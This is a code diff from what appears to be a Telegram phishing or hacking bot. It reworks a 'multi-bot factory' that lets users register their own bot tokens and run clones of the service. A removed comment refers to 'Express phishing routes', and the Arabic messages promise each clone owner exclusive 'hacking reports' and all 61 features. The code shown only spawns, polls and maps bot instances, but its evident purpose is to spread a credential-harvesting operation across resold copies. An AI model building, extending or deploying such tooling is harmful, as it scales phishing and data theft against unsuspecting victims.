@@ -4093,85 +4093,97 @@ function persistNewToken(token, ownerId, botUsername) {
     }
 }
 
-// Map token to ownerId for Express phishing routes
 global.botTokenToOwner = global.botTokenToOwner || {};
-global.botTokenToOwner[botToken] = developerId; // Main bot owner
+global.botTokenToOwner[botToken] = developerId; 
 
-function spawnBotInstance(token, isMain = false, specificOwner = null) {
+async function spawnBotInstance(token, isMain = false, specificOwner = null) {
     if (activeBotInstances[token]) return;
     
     try {
-        const b = new TelegramBot(token, {
-            polling: { interval: 200, autoStart: true, params: { timeout: 10, limit: 100 } }
-        });
+        const b = new TelegramBot(token, { polling: false });
+        
+        try {
+            await b.deleteWebHook();
+            console.log(`Webhook deleted for: ${token.substring(0,10)}...`);
+        } catch(e) {}
 
-        b.on('error', (err) => {});
+        const delay = isMain ? 500 : Math.floor(Math.random() * 10000) + 2000;
+        setTimeout(async () => {
+            try {
+                await b.startPolling({
+                    interval: 300,
+                    autoStart: true,
+                    params: { timeout: 10, limit: 100 }
+                });
+                console.log(`Polling started for: ${token.substring(0,10)}...`);
+            } catch(err) {
+                if (err.message && err.message.includes('409 Conflict')) {
+                    console.log(`Conflict for ${token.substring(0,10)}..., retrying in 30s`);
+                    setTimeout(() => spawnBotInstance(token, isMain, specificOwner), 30000);
+                }
+            }
+        }, delay);
+
+        b.on('error', (err) => { console.error(`Bot Error [${token.substring(0,5)}]:`, err.message); });
         b.on('polling_error', (err) => {
-            if (err.message && err.message.includes('409 Conflict')) {
-                // Ignore or handle
+            if (!err.message.includes('409 Conflict')) {
+                console.error(`Polling Error [${token.substring(0,5)}]:`, err.message);
             }
         });
 
-        // Store owner mapping
         const owner = specificOwner || developerId;
         global.botTokenToOwner[token] = owner;
 
-        // Hook into messages for Add Bot feature
         b.on('message', async (msg) => {
             const chatId = msg.chat.id;
             const text = msg.text;
             if (!text && !msg.photo) return;
 
-            // Check if awaiting token for new bot
             if (userStatesManus[chatId + '_' + token] === 'wait_clone_token') {
                 delete userStatesManus[chatId + '_' + token];
                 const newToken = text.trim();
                 if (newToken.length < 20 || !newToken.includes(':')) {
-                    return b.sendMessage(chatId, "❌ التوكن غير صالح. تأكد من صحة توكن بوتك من @BotFather.");
+                    return b.sendMessage(chatId, "❌ التوكن غير صالح.");
                 }
                 try {
                     const tempBot = new TelegramBot(newToken);
                     const me = await tempBot.getMe();
                     persistNewToken(newToken, chatId, me.username);
                     spawnBotInstance(newToken, false, chatId);
-global.botUsernames[newToken] = me.username;
-                    return b.sendMessage(chatId, `✅ **تم إنشاء وتشغيل نسختك الخاصة بنجاح!**\n\n🤖 اسم البوت: @${me.username}\n🆔 الآيدي: ${me.id}\n\nالبوت الآن يعمل بكافة ميزات الـ 61 زر، وستصلك تقارير الاختراق الخاصة به حصرياً على حسابك هنا!`, { parse_mode: 'Markdown' });
+                    global.botUsernames[newToken] = me.username;
+                    return b.sendMessage(chatId, `✅ **تم تشغيل بوتك بنجاح!**\n\n🤖 @${me.username}\n\nستصلك تقارير الاختراق هنا!`, { parse_mode: 'Markdown' });
                 } catch(e) {
-                    return b.sendMessage(chatId, "❌ فشل التحقق من التوكن. تأكد أنه صحيح وغير مرتبط بـ Webhook حالياً.");
+                    return b.sendMessage(chatId, "❌ فشل التحقق من التوكن.");
                 }
             }
         });
 
-        // Hook into callback_query for Add Bot button
         b.on('callback_query', async (query) => {
             const chatId = query.message.chat.id;
             const action = query.data;
-
             if (action === 'clone_my_bot') {
                 userStatesManus[chatId + '_' + token] = 'wait_clone_token';
-                return b.sendMessage(chatId, "🤖 **صنع بوت خاص بك (نسخة طبق الأصل)**\n\n1️⃣ أنشئ بوت جديد عبر @BotFather\n2️⃣ أرسل لي (التوكن) الخاص به هنا:", { parse_mode: 'Markdown' });
+                return b.sendMessage(chatId, "🤖 **صنع بوت خاص بك**\n\nأرسل التوكن الخاص بك من @BotFather هنا:");
             }
         });
 
         activeBotInstances[token] = b;
-        b.getMe().then(me => { global.botUsernames[token] = me.username; b.options.username = me.username; });
-        console.log(`Cloned Bot Instance Running: ${token.substring(0,10)}... (Owner: ${owner})`);
+        b.getMe().then(me => { 
+            global.botUsernames[token] = me.username; 
+            b.options.username = me.username; 
+        }).catch(() => {});
+        
     } catch(e) {
         console.error(`Failed to spawn bot ${token}:`, e.message);
     }
 }
 
-// 1. Start Main Bot
 spawnBotInstance(botToken, true, developerId);
 
-// 2. Start all previously saved clones
 const savedClones = getStoredTokens();
 savedClones.forEach(item => {
     if (item.token !== botToken) {
         spawnBotInstance(item.token, false, item.ownerId);
     }
 });
-
-// 3. Add "أضف بوتك" button to the main menu definition in index.js
-// We ensure the button exists in mainMenuButtons
 // --- END MULTI-BOT FACTORY ---
